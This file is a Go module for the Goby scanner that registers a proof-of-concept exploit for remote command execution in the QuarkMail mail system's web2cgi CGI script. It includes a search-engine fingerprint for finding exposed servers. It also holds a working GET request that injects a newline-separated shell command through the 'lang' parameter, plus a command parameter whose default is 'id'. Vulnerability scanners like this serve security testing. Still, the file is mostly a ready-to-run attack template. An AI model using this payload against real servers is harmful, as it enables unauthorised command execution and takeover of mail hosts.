package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "QuarkMail web2cgi rce",
    "Description": "QuarkMail (QuarkMail) is a mail system software developed by Beijing Xiongzhi Weiye Co., Ltd. The related version of Quark Mail product uses CGI scripts, and there is a remote code execution vulnerability. Attackers can use the vulnerability to launch remote attacks by executing Specific instructions gradually penetrate and control the mail server host.",
    "Impact": "QuarkMail web2cgi rce",
    "Recommendation": "<p>update.</p>",
    "Product": "QuarkMail",
    "VulType": [
        "Command Execution"
    ],
    "Tags": [
        "Command Execution"
    ],
    "Translation": {
        "CN": {
            "Name": "QuarkMail web2cgi 文件 命令执行漏洞",
            "Description": "快客电邮(QuarkMail)是北京雄智伟业有限公司开发的一套优秀的企业级邮件系统。有漏洞版本使用CGI脚本，存在一个远程执行代码漏洞。攻击者可以通过执行特定指令来逐渐渗透并控制邮件服务器主机，从而利用此漏洞发起远程攻击。",
            "Impact": "<p>攻击者可通过该漏洞在服务器端任意执⾏代码，写⼊后⻔，获取服务器权限，进⽽控制整个web服务器。</p>",
            "Recommendation": "<p>1、通过防⽕墙等安全设备设置访问策略，设置⽩名单访问。</p><p>2、如⾮必要，禁⽌公⽹访问该系统。</p><p>升级 QuarkMail 至最新版本</p>",
            "Product": "QuarkMail",
            "VulType": [
                "命令执行"
            ],
            "Tags": [
                "命令执行"
            ]
        },
        "EN": {
            "Name": "QuarkMail web2cgi rce",
            "Description": "QuarkMail (QuarkMail) is a mail system software developed by Beijing Xiongzhi Weiye Co., Ltd. The related version of Quark Mail product uses CGI scripts, and there is a remote code execution vulnerability. Attackers can use the vulnerability to launch remote attacks by executing Specific instructions gradually penetrate and control the mail server host.",
            "Impact": "QuarkMail web2cgi rce",
            "Recommendation": "<p>update.</p>",
            "Product": "QuarkMail",
            "VulType": [
                "Command Execution"
            ],
            "Tags": [
                "Command Execution"
            ]
        }
    },
    "FofaQuery": "((body=\"window.location.replace(\\\"/cgi-bin/web2cgi/index.cgi\\\");\" && body!=\"<a\" ) || banner=\"quarkmail server\" || body=\"<iframe src=\\\"/cgi-bin/web2cgi/index.cgi\\\" scrolling=\\\"no\\\" frameborder=\")",
    "GobyQuery": "((body=\"window.location.replace(\\\"/cgi-bin/web2cgi/index.cgi\\\");\" && body!=\"<a\" ) || banner=\"quarkmail server\" || body=\"<iframe src=\\\"/cgi-bin/web2cgi/index.cgi\\\" scrolling=\\\"no\\\" frameborder=\")",
    "Author": "langke",
    "Homepage": "http://www.ipmotor.com/index.html",
    "DisclosureDate": "2021-05-21",
    "References": [],
    "HasExp": true,
    "Is0day": false,
    "Level": "3",
    "CVSS": "9.8",
    "CVEIDs": [],
    "CNVD": [],
    "CNNVD": [],
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/cgi-bin/web2cgi/get.cgi?lang=%0Aecho%09%60echo%20608c5255daf7cf0%22%22%27%27d2c930fb1fe6377b9%60&dir=foo",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "608c5255daf7cf0d2c930fb1fe6377b9",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/cgi-bin/web2cgi/get.cgi?lang=%0Aecho%09%60echo%20608c5255daf7cf0%22%22%27%27d2c930fb1fe6377b9%60&dir=foo",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "608c5255daf7cf0d2c930fb1fe6377b9",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExpParams": [
        {
            "name": "cmd",
            "type": "input",
            "value": "id",
            "show": ""
        }
    ],
    "ExpTips": {
        "type": "",
        "content": ""
    },
    "AttackSurfaces": {
        "Application": [],
        "Support": [],
        "Service": [],
        "System": [],
        "Hardware": []
    },
    "PocId": "10195"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}
